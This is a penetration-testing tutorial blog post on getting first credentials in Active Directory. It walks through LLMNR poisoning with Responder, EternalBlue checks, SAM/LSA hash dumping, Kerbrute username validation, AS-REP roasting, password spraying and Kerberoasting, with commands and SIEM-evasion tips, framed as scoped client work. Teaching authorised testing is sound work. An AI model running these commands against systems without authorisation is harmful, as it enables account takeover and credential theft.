---
title: "Active Directory Penetration Testing: How It All Starts (Enumeration & First Credentials)"
date: 2026-08-11
categories: [Active Directory, Enumeration]
tags: [active-directory, enumeration, recon, nmap, osint, responder, ldap, smb]
---

## Introduction

If we're talking about Active Directory pentesting, we're already inside the client's internal network. (Not a victim's network — that would be illegal, and also a very different kind of blog post.)

Most of the time, in my personal experience, the foothold machine is a Linux host. That's because the most common path in is through a poorly written web application running on Apache or Nginx. Occasionally it's a broken app on IIS — but in my experience, that's less frequent.

Either way, once we have a shell, the first question is always the same: *where are we, and what's around us?*

Enumeration is an iterative process. It covers multiple layers — the host itself, the network, users, services, configurations. And here's the most important thing I can tell you as a reader:

> **If you're stuck and can't move forward — go back. Enumerate again. Something is always there.**

---

## The General Flow

The typical path from initial access to Active Directory looks something like this:

```
Broken web app
    → Shell obtained
        → Privilege escalation
            → Persistence
                → Local recon (credentials, config files, etc.)
                    → Pivoting
                        → Network recon
                            → AD identified
```

At some point during network recon, you'll spot a machine that looks different from the rest. The port layout gives it away immediately.

---

## Recognizing a Domain Controller

A Domain Controller has a very recognizable fingerprint. When you run an Nmap scan against a host and see something like this — you know exactly what you're looking at:

```
Nmap scan report for 192.168.1.10
Host is up (0.039s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: corp.local)
445/tcp   open  microsoft-ds  Windows Server microsoft-ds (workgroup: CORP)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: corp.local)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0
```

The key ports to recognize:

| Port | Service | Why it matters |
|------|---------|----------------|
| 88   | Kerberos | Authentication — this is a DC |
| 389  | LDAP | Directory services |
| 636  | LDAPS | LDAP over SSL |
| 3268 | Global Catalog | Forest-wide LDAP |
| 445  | SMB | File sharing, lateral movement |
| 5985 | WinRM | Remote management — useful if you get creds |

The LDAP banner will usually give you the domain name directly:

```
389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: corp.local)
```

You now know the domain. You know there's a DC. Time to start pulling information.

---

## The Goal

Before we dive into tools and techniques, let's be clear about one thing:

**Our objective is to authenticate to Active Directory.**

Everything we do at this stage serves that single goal. Keep it in mind — it'll help you stay focused when you're deep in enumeration and losing the thread.

Now, how you approach this depends entirely on what you have in hand. Two scenarios:

1. **You have credentials** — a username, a password, a hash, anything that can authenticate you.
2. **You have nothing** — no creds, no accounts, just a shell on a machine inside the network.

---

## The Analogy

Think of it like building a wooden house.

- **Goal** — build the house (authenticate to AD)
- **Material** — wood and nails (credentials in any form)
- **Tool** — a hammer (something that lets you use those credentials — Kerbrute, Impacket, NetExec, etc.)

You can have the best hammer in the world. Without material, you're not building anything. So the first task is always finding material — credentials in any shape or form that lets us authenticate.

---

## Part 1: No Credentials

### Step 1 — Low Hanging Fruit

Before doing anything noisy, check what the network is already giving away for free. Misconfigured services are extremely common in real environments and can hand you a username list — or even credentials — without a single authentication attempt.

#### LDAP Anonymous Bind

Some DCs still allow anonymous LDAP queries. This means you can pull users, groups, and other directory objects without any credentials at all.

```bash
# Check if anonymous bind is allowed
ldapsearch -x -H ldap://192.168.1.10 -b "DC=corp,DC=local"

# Pull all users
ldapsearch -x -H ldap://192.168.1.10 -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName
```

If this works — you already have a user list. Skip the OSINT section and move straight to password attacks.

#### SMB Null Sessions

Same idea on SMB. Null sessions allow unauthenticated access to certain SMB resources and can expose user and group information.

```bash
# Check for null session
nxc smb 192.168.1.0/24 -u '' -p ''
nxc smb 192.168.1.0/24 -u 'guest' -p ''

# Enumerate shares
nxc smb 192.168.1.10 -u '' -p '' --shares

# Spider shares for interesting files
nxc smb 192.168.1.10 -u '' -p '' -M spider_plus
```

People leave things in file shares. Credentials in scripts, passwords in Excel files, config files with plaintext secrets. It happens constantly in real environments.

#### Other Services — FTP, Web, Databases

Don't tunnel vision on AD. Scan the full network and check everything:

```bash
# Check FTP anonymous login
nxc ftp 192.168.1.0/24 -u 'anonymous' -p 'anonymous'
```

Any service that exposes files or data without authentication is worth checking. Web applications running internally, exposed databases, unprotected network shares — all potential sources of credentials or usernames.

#### Critical Vulnerabilities — Don't Skip Vuln Scanning

While you're at it — don't forget to check for known critical vulnerabilities on the hosts you discover. A classic example is **MS17-010 (EternalBlue)**, which exploits a vulnerability in SMBv1 and gives you SYSTEM-level access without any credentials at all.

```bash
nxc smb 192.168.1.0/24 -M ms17-010
```

If a domain-joined machine is vulnerable, you land as SYSTEM on that host. From there you can dump local credentials — SAM hashes, LSA secrets, and cached domain credentials:

```bash
# Save registry hives from SYSTEM shell
reg save HKLM\SAM sam.save
reg save HKLM\SECURITY security.save
reg save HKLM\SYSTEM system.save

# Dump locally from saved hives
impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL
```

Since the machine is joined to the domain, you can use the machine account to query AD — which means you're no longer operating blind. EternalBlue is old but still found in real environments, especially on legacy infrastructure. Always check.

> Obviously, exploiting production systems carries risk. Coordinate with your client and know your scope before pulling the trigger on anything this impactful.

---

### Step 2 — Responder (Passive Credential Capture)

If low hanging fruit didn't produce anything useful, the next step is to listen. Since we're on a Linux host with port 445 available, we can run Responder and passively capture authentication material from the network.

```bash
responder -I eth0 -wf
```

Responder poisons LLMNR, NBT-NS, and MDNS responses — when a machine on the network tries to resolve a hostname that doesn't exist in DNS, Responder answers and captures the authentication attempt. The result is an NTLMv2 hash.

```
[SMB] NTLMv2-SSP Hash : r.nilson::CORP:a3f8c2d1e9b8...
```

Take it offline:

```bash
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
```

If it cracks — you have a valid credential. If not, the hash may still be useful for relay attacks.

> **LDAP signing and channel binding:** Before going deep into relay attacks — worth knowing that two settings on the DC directly affect whether NTLMv2 relay works at all. **LDAP signing** requires that LDAP traffic be cryptographically signed — if enabled, you can't relay captured hashes to LDAP. **LDAP channel binding** ties the authentication to the TLS channel — if enabled, relay to LDAPS is also blocked. In modern environments Microsoft has been pushing these on by default, but in practice many organisations still have them disabled or set to "if supported" rather than "required". You can check remotely:
>
> ```bash
> nxc ldap 192.168.1.10 -u '' -p '' -M ldap-checker
> ```
>
> If signing and channel binding are not enforced — relay attacks are viable and the hash you caught with Responder becomes significantly more useful than just cracking material.

> Capturing hashes is just the beginning. LLMNR/NBT-NS poisoning, NTLMv2 relay, and coercion techniques are covered in depth in a separate post.

---

### Step 3 — Building a Valid Username List (OSINT)

If neither passive capture nor unauthenticated access produced results, we need to build a username list from scratch and start actively enumerating. But before generating any list, there's something critical to figure out first.

#### Understanding the Login Format

Even with a list of real employee names, you can't do anything useful until you know how the company formats their logins.

Take **Rick Nilson**. His AD username could be any of these:

```
rick.nilson
r.nilson
rnilson
nilson.rick
nilsonr
rick
```

Without knowing the format, you're generating five to ten variations per person and throwing all of them at the DC — noisy, slow, and likely to trigger lockouts. Figure out the format first, then build one clean list.

Also worth noting: not every company follows standard patterns. In real engagements I've come across formats like `XXX000` — completely custom schemes that no wordlist or tool will guess. When you find a confirmed username through any means, study it carefully before assuming the format.

#### LinkedIn — Employee Names at Scale

LinkedIn gives you employee names in bulk. **linkedin2username** scrapes a company's LinkedIn and generates lists in every common format simultaneously:

```bash
git clone https://github.com/initstring/linkedin2username
cd linkedin2username
uv sync
uv run python linkedin2username.py -c target-company -n corp.local
```

Output:

```
first.last.txt   → rick.nilson@corp.local
f.last.txt       → r.nilson@corp.local
flast.txt        → rnilson@corp.local
firstl.txt       → ricks@corp.local
lastf.txt        → nilsonr@corp.local
```

Once you've confirmed the format from the company website, pick the right file. One clean list instead of five noisy ones.

> **Note:** Requires a LinkedIn account. More connections = better results. Use `--geoblast` or `--keywords` to bypass the 1000 employee cap.

#### Company Website — Finding the Format

The company's own website often gives away the login format directly. Sales teams, department heads, and managers frequently leave their personal corporate email addresses for client contact. One email address tells you everything:

If you find `r.nilson@corp.com` on a contact page — the format is `f.last`. Done. Now go back to your linkedin2username output, pick `f.last.txt`, and you have one clean targeted list instead of five noisy ones.

Medium and larger companies also often publish a management board or leadership page. Check those first — high-value targets with confirmed names and sometimes confirmed email formats.

#### Google Dorks & PDF Metadata

Published documents are another underrated source. Companies put PDFs on their websites constantly — reports, presentations, brochures. Those PDFs often contain metadata, and that metadata sometimes includes the username of whoever created or saved the file.

```bash
# Google dork to find PDFs from a specific domain
site:corp.com filetype:pdf
```

Download a few, then extract metadata:

```bash
exiftool document.pdf
```

Output might look like this:

```
File Name         : annual_report_2025.pdf
Author            : r.nilson
Creator           : Microsoft Word
Producer          : Adobe PDF
```

There's your username format confirmed, and potentially a specific username as a bonus.

#### theHarvester

For broader OSINT — emails, subdomains, hosts — **theHarvester** is built into Kali and still relevant:

```bash
theHarvester -d corp.com -b google,bing,linkedin -l 500
```

It won't replace LinkedIn scraping for usernames, but it's useful for finding exposed email addresses and confirming the email format before you start enumerating.

#### Generating the Final List

Once you know the format, **username-anarchy** converts raw names to the right pattern:

```bash
git clone https://github.com/urbanadventurer/username-anarchy
./username-anarchy --input-file names.txt --select-format first.last > usernames.txt
```

Or a simple bash one-liner for `f.last`:

```bash
while IFS= read -r line; do
  first=$(echo "$line" | awk '{print tolower(substr($1,1,1))}')
  last=$(echo "$line" | awk '{print tolower($2)}')
  echo "${first}.${last}@corp.local"
done < names.txt
```

After all that work, your list might look something like this:

```
r.nilson@corp.local
a.kowalski@corp.local
m.brown@corp.local
d.jones@corp.local
k.mueller@corp.local
...
```

Looks good. But here's the thing — not all of these usernames necessarily exist. LinkedIn data can be outdated, people leave companies, names get misspelled. Throwing this list straight at the DC with password spraying is a bad idea — you'll be generating failed authentication attempts for accounts that don't even exist, which is noisy and wasteful.

Before anything else, we validate the list.

### Step 4 — Validating Usernames with Kerbrute

**Kerbrute** uses the Kerberos protocol to check whether a username exists in the domain — without ever attempting to authenticate. Here's why that matters:

When you send a Kerberos AS-REQ for a valid user, the DC responds with a specific error (`KDC_ERR_PREAUTH_REQUIRED`) — essentially saying "I know this user, give me your pre-authentication." For an invalid user, the DC responds with a completely different error (`KDC_ERR_C_PRINCIPAL_UNKNOWN`) — "never heard of them."

Kerbrute exploits this difference. It's not a login attempt. No authentication is performed, no password is submitted, no lockout policy is triggered. In most environments this traffic doesn't even get flagged — it looks like normal Kerberos noise.

```bash
kerbrute userenum -d corp.local --dc 192.168.1.10 usernames.txt
```

Output:

```
2026/08/11 14:22:01 >  [+] VALID USERNAME: r.nilson@corp.local
2026/08/11 14:22:01 >  [+] VALID USERNAME: m.brown@corp.local
2026/08/11 14:22:01 >  [-] INVALID: a.kowalski@corp.local
2026/08/11 14:22:01 >  [+] VALID USERNAME: k.mueller@corp.local
2026/08/11 14:22:01 >  [-] INVALID: d.jones@corp.local
2026/08/11 14:22:01 >  [+] VALID USERNAME: t.wagner@corp.local
```

In practice you'll often find that 60-70% of your OSINT-generated list is valid — the rest are outdated entries or people who've left. Now you have a clean, confirmed list of real accounts. That's what we work with from here.

### Step 5 — AS-REP Roasting (Before You Spray)

Before going loud with password spraying, there's one more thing worth trying — **AS-REP Roasting**. It's quieter, targets only specific misconfigured accounts, and can hand you a crackable hash without a single login attempt.

Here's how it works: by default, Kerberos requires users to prove their identity before requesting a ticket — this is called **pre-authentication**. Some accounts have this disabled (intentionally or not). When pre-authentication is off, you can request an AS-REP ticket for that user without knowing their password. The DC responds with a ticket encrypted with the user's password hash — which you can take offline and crack.

No lockout. No authentication attempt. Just a hash.

```bash
impacket-GetNPUsers corp.local/ -no-pass -usersfile valid_users.txt -dc-ip 192.168.1.10
```

If any accounts are vulnerable:

```
$krb5asrep$23$r.nilson@CORP.LOCAL:a3f8c2d1e9b87f4c...
```

Crack it offline:

```bash
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

If it cracks — you have a valid plaintext credential. Skip spraying entirely and move straight to authenticated enumeration.

If nothing comes back — no accounts have pre-auth disabled, or the hashes didn't crack. That's fine. Move to the next step.

> **Heads up:** In well-defended environments, security teams sometimes configure honeypot accounts — fake accounts with pre-authentication disabled specifically to attract AS-REP Roasting attempts. The moment you request a ticket for one of these accounts, an alert fires. There's no reliable way to identify them beforehand since they look like any other account. This is another reason to be targeted rather than throwing your entire list at the DC blindly — the smaller and more deliberate your list, the lower the chance of hitting a trap.
>
> **If you already have credentials** from a previous step, you can query account attributes before roasting — specifically `lastLogon` and `logonCount`. Honeypot accounts by their nature are rarely or never actually used, so they tend to have suspiciously low logon counts or a `lastLogon` value of zero. A real employee account that's been active for years will have hundreds of logons and a recent timestamp. An account that's never been logged into is worth a second look before you request a ticket for it:
>
> ```bash
> ldapsearch -x -H ldap://192.168.1.10 -D "r.nilson@corp.local" -w 'Winter2025!' \
>   -b "DC=corp,DC=local" "(sAMAccountName=suspicioususer)" lastLogon logonCount userAccountControl
> ```
>
> This won't catch every honeypot — some are configured more carefully — but it's a quick sanity check that costs nothing.

> AS-REP Roasting and Kerberoasting are deep topics — the underlying Kerberos protocol mechanics, ticket structure, and detection evasion are covered in detail in a dedicated post.

**Bonus tip:** Don't only run AS-REP against your OSINT user list. Service accounts are a goldmine — admins often create them with weak passwords and pre-auth disabled. Names like `svc_backup`, `svc_veeam`, `svc_sql`, `svc_deploy` are extremely common across environments. Grab a service account wordlist from GitHub and throw it at the DC alongside your user list:

```bash
# Combine your validated users with a svc wordlist
cat valid_users.txt svc_accounts.txt | sort -u > full_list.txt

impacket-GetNPUsers corp.local/ -no-pass -usersfile full_list.txt -dc-ip 192.168.1.10
```

Service accounts frequently have pre-auth disabled AND weak passwords. If one cracks — it often has elevated privileges too.

### Step 6 — Password Spraying

AS-REP didn't produce anything. Now we go active — but carefully.

Password spraying is the art of trying one password against many users, rather than many passwords against one user. The distinction matters: AD lockout policies typically lock an account after X failed attempts *for that account*. If you try one password per user and move on, you stay well under the threshold.

**The golden rule: know the lockout policy before you spray.**

If you don't know the policy and you spray aggressively, you will lock accounts. In a real engagement that's a very bad day — you've just taken down user accounts and someone is going to notice.

Check the policy first:

```bash
nxc smb 192.168.1.10 -u '' -p '' --pass-pol
```

> **A quick note on this:** Some people assume that pulling the password policy requires a null session — and if null sessions are disabled, you can't get it. That's not quite right. `--pass-pol` queries the policy via the SAMR or LSA protocol, which Windows has historically allowed anonymously even when null session enumeration is restricted. So you may be able to pull the policy on a machine where `--users` returns nothing.
>
> That said — if `--pass-pol` works, always try `--users` immediately after:
> ```bash
> nxc smb 192.168.1.10 -u '' -p '' --users
> ```
> If that works too, you already have a validated user list without any OSINT. Skip straight to AS-REP Roasting or spraying. These are two different mechanisms — one working doesn't guarantee the other will, but it's always worth checking both.

Look for `Lockout threshold` and `Observation window`. If threshold is 5 attempts and the window resets every 30 minutes — you can safely try 1 password per user, wait 31 minutes, try another. Never approach the threshold.

But the lockout policy isn't the only useful thing here. If you get a full policy output, pay attention to **minimum password length** and **complexity requirements**:

```
Minimum password length: 8
Password complexity: Enabled
Password history length: 10
Lockout threshold: 5
Observation window: 30 minutes
Lockout duration: 30 minutes
```

This tells you a lot. Complexity enabled means the password must contain uppercase, lowercase, digits, and special characters. Minimum length 8 means anything shorter is invalid. You can immediately filter your spray list — no point trying `Summer24` if minimum length is 8 and complexity is on. Focus on candidates that actually meet the policy:

```
Winter2025!   ✓ length 10, has upper/lower/digit/special
Welcome1!     ✓ length 9, meets complexity
Corp2024      ✗ no special character — skip
password      ✗ too short, no complexity — skip
```

The more you know about the policy, the more surgical your spray becomes.

> **One more thing:** What `--pass-pol` returns is the *default* domain policy. But Active Directory supports **Fine-Grained Password Policies (PSOs)** — separate policies applied to specific groups or individual accounts, independent of the domain default. In practice this means a group like Domain Admins or a set of service accounts could have a lockout threshold of 3 while everyone else has 5. You won't see this from an anonymous query. If you already have credentials, you can check for PSOs:
>
> ```bash
> ldapsearch -x -H ldap://192.168.1.10 -D "r.nilson@corp.local" -w 'Winter2025!' \
>   -b "CN=Password Settings Container,CN=System,DC=corp,DC=local" \
>   "(objectClass=msDS-PasswordSettings)" msDS-LockoutThreshold msDS-MinimumPasswordLength msDS-PasswordSettingsPrecedence
> ```
>
> If PSOs exist — pay attention to which accounts they apply to before you spray them. A tighter lockout threshold on a high-value account you're targeting is how you accidentally lock out the CEO.

**Choosing passwords to spray:**

Don't spray with rockyou. Think like a sysadmin setting a default password:

```
Season+Year:     Winter2024!, Summer2025!
Company name:    Corp2024!, Acme@2025
Common defaults: Password1!, Welcome1!, P@ssw0rd
Month+Year:      January2025!, August2026!
```

Start with the most likely candidates. One at a time.

**Spraying with NetExec:**

```bash
nxc smb 192.168.1.10 -u valid_users.txt -p 'Winter2025!' --continue-on-success
```

`--continue-on-success` is important — without it NXC stops on the first hit. You want to know every account that matches.

Successful hit looks like this:

```
SMB  192.168.1.10  445  CORP-DC  [+] corp.local\r.nilson:Winter2025! 
```

**Spraying with Kerbrute:**

Kerbrute can also spray — and it's quieter than SMB authentication attempts since it uses Kerberos:

```bash
kerbrute passwordspray -d corp.local --dc 192.168.1.10 valid_users.txt 'Winter2025!'
```

Why is this cleaner? When you spray via SMB, every failed attempt generates a Windows Security Event **4625** (failed logon) — this is exactly what SOC teams and SIEM rules watch for. Kerbrute goes through Kerberos on port 88 instead, generating event **4771** (Kerberos pre-authentication failed). Most environments log this far less aggressively, and many SIEM rules simply don't alert on it. The traffic also blends in with normal Kerberos activity on the network. It's not invisible — but it's significantly less likely to trigger an alert than a wave of SMB logon failures.

---

### Summary — What We Just Did

We covered some of the most common paths to a first valid credential. This is by no means exhaustive — there are deeper, more complex chains depending on the environment. But here's what we walked through:

**Chain 1 — Unauthenticated protocol access**
Check for SMB null sessions, RPC null sessions, LDAP anonymous bind. If any work — pull the user list directly. Then: AS-REP Roasting or password spraying.

**Chain 2 — Other low-hanging services**
No null sessions or anon binds. Look elsewhere in the network segment — NFS, FTP without auth, internal web apps, config files on accessible shares. Collect credentials or login format clues. Then: same as above — AS-REP or spraying.

**Chain 3 — Protocol exploitation**
No open services, nothing useful in the segment. Look for known vulnerabilities — EternalBlue being the classic example. Compromise a domain-joined machine, land as SYSTEM, use the machine account to query AD or run SharpHound. Now you have a full user list and domain structure. From here: password spraying, AS-REP Roasting, and — since you now have an authenticated context — Kerberoasting.

**Chain 4 — OSINT when everything else fails**
No open services, no exploitable vulnerabilities, Responder caught nothing. You go external. Scrape LinkedIn with linkedin2username, confirm the login format from the company website or PDF metadata, generate a clean username list with username-anarchy or a bash one-liner. Validate it with Kerbrute to cut out stale accounts. Then: AS-REP Roasting against the confirmed list, followed by password spraying — one password at a time, within the lockout policy window.

These chains aren't mutually exclusive and they're not strictly sequential. Real engagements are messy — you follow what the environment gives you. The point is to understand what each technique requires and what it produces, so you can chain them together logically without making noise you don't need to make.

You now have a valid credential. Build the house.

---

## Part 2: You Have Credentials — Now What?

You have a username and a password. Or a hash. Either way — you can authenticate. The game changes completely at this point.

### The Temptation: BloodHound

The first instinct for most people is to fire up BloodHound and collect everything at once. And honestly — it's a great instinct. BloodHound is the single best tool for understanding an AD environment, visualizing attack paths, and finding the shortest route to Domain Admin.

But it comes at a cost. BloodHound's collector (SharpHound on Windows, BloodHound.py on Linux) works by sending a large volume of LDAP queries to the DC in a short amount of time. In a monitored environment, that kind of traffic stands out — it looks exactly like what it is: automated enumeration. A tuned SIEM or an alert defender will notice.

```bash
# Remote collection from Linux
bloodhound-python -u r.nilson -p 'Winter2025!' -d corp.local --dc 192.168.1.10 -c All
```

If stealth isn't a concern — run it. The data you get is invaluable. If you're in a red team engagement where staying undetected matters — read on.

### Staying Quiet: Targeted Enumeration

When noise is a problem, ditch the automated collectors and go manual. The idea is simple: instead of sending hundreds of LDAP queries automatically, you send exactly the queries you need, one at a time. Less traffic, less pattern, less detection.

The tools for this:

**ldapsearch** — raw LDAP queries, surgical precision:

```bash
# Who is Rick Nilson?
ldapsearch -x -H ldap://192.168.1.10 -D "r.nilson@corp.local" -w 'Winter2025!' \
  -b "DC=corp,DC=local" "(sAMAccountName=r.nilson)"

# What groups is he in?
ldapsearch -x -H ldap://192.168.1.10 -D "r.nilson@corp.local" -w 'Winter2025!' \
  -b "DC=corp,DC=local" "(member=CN=Rick Nilson,CN=Users,DC=corp,DC=local)" cn
```

**rpcclient** — enumerating users, groups, and shares over RPC:

```bash
rpcclient -U "r.nilson%Winter2025!" 192.168.1.10

# Inside rpcclient:
enumdomusers
enumdomgroups
queryuser r.nilson
# Take the RID from queryuser output, then:
queryusergroups <RID>
```

**bloodyAD** — the best manual alternative to BloodHound. Think of it as BloodHound's quieter cousin — targeted queries, no mass enumeration:

```bash
bloodyAD -u r.nilson -p 'Winter2025!' -d corp.local --dc-ip 192.168.1.10 get object r.nilson --attr memberOf
bloodyAD -u r.nilson -p 'Winter2025!' -d corp.local --dc-ip 192.168.1.10 get membership r.nilson
```

### First Questions to Answer

When you land with a credential, the first thing you want to know is: **who is this user and what can they reach?**

#### Who is Rick Nilson?

Check his group memberships — this tells you his privilege level immediately:

```bash
nxc smb 192.168.1.10 -u r.nilson -p 'Winter2025!' --groups
```

Is he in Domain Admins? Remote Desktop Users? Account Operators? Each group opens different doors. Even a regular user in an unexpected group can be the beginning of an attack chain.

#### What Shares Can He Access?

With valid credentials, enumerate SMB shares across the network segment:

```bash
nxc smb 192.168.1.0/24 -u r.nilson -p 'Winter2025!' --shares
```

Authenticated access opens significantly more than null sessions. You may find shares that were invisible before — file servers, backup shares, department folders. Dig through them:

```bash
nxc smb 192.168.1.10 -u r.nilson -p 'Winter2025!' -M spider_plus
```

People store things they shouldn't in file shares. Credentials, scripts, backups, database dumps. It's worth the time.

> **A note for later:** Writable shares open up interesting attack paths — for example, dropping a malicious `.lnk` file on a share and capturing the hash of anyone who opens the folder with Responder listening. That's a topic for a dedicated post, but keep it in mind.

#### What Services Can He Reach?

Credentials open more than just SMB. Scan the internal network for services that accept authentication:

- **Web panels** — internal GitLab, Confluence, JIRA, monitoring dashboards, admin panels. Try the same credentials everywhere. Password reuse is real.
- **WinRM** — if the user is in the Remote Management Users group, you may get a shell:

```bash
nxc winrm 192.168.1.0/24 -u r.nilson -p 'Winter2025!'
```

- **Exchange / internal mail** — if the environment has on-prem Exchange or is synced with Azure AD, email access opens the door to internal phishing. You can send emails as a legitimate internal user — that's a very different threat surface than an external phish.
- **Local Slack, Teams, or other internal tools** — people discuss sensitive things in chat. Credentials, deployment procedures, incident response. Worth checking if accessible.

> **Critical note on scope:** Accessing internal communication platforms — Teams, Slack, email — and anything related to phishing or social engineering must be explicitly agreed upon with the client before you touch it. This isn't a formality. Reading internal messages, impersonating employees, or sending phishing emails as a legitimate user can have serious legal and reputational consequences for both sides. Every step of this nature needs to be in scope, documented, and pre-approved. When in doubt — stop and ask. No finding is worth the legal exposure.

### Kerberoasting — The First Escalation Attempt

One of the first things to try with any authenticated context — whether it's a domain user account or a SYSTEM shell on a domain-joined machine — is Kerberoasting.

Here's the concept: Active Directory uses **Service Principal Names (SPNs)** to associate services with accounts. An SPN is essentially a unique identifier that says "this account runs this service." Any authenticated user in the domain can query the DC for a list of all accounts that have SPNs registered.

When you request a Kerberos service ticket for one of those accounts, the DC responds with a ticket encrypted using that service account's password hash. You take that ticket offline and crack it. No elevated privileges required — just a valid domain authentication context.

```bash
# Request all Kerberoastable accounts
impacket-GetUserSPNs corp.local/r.nilson:'Winter2025!' -dc-ip 192.168.1.10 -request
```

Output:

```
ServicePrincipalName          Name          MemberOf  PasswordLastSet
----------------------------  ------------  --------  -------------------
MSSQLSvc/sql01.corp.local     svc_sql                 2023-04-12 09:14:22
HTTP/intranet.corp.local      svc_web                 2022-11-03 14:55:01

$krb5tgs$23$*svc_sql$CORP.LOCAL$MSSQLSvc/sql01.corp.local*$a3f8c2...
```

Crack it offline:

```bash
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
```

Service accounts are often overlooked from a password hygiene perspective — they get created, assigned a weak password, and never touched again. That makes them prime Kerberoasting targets.

The same logic applies if you compromised a domain-joined machine as SYSTEM — the machine account itself can authenticate to the domain and request SPNs, so you don't even need a user credential.

> AS-REP Roasting and Kerberoasting — the underlying Kerberos protocol mechanics, ticket structure, opsec considerations, and detection evasion — are covered in depth in a dedicated post.

### The Bigger Picture

One credential is a foothold into the authenticated world of AD. From here the enumeration goes deeper — ACLs, GPOs, trust relationships, delegation configurations, and attack paths that only become visible once you're inside. That's where BloodHound really shines and where the path to Domain Admin starts taking shape.
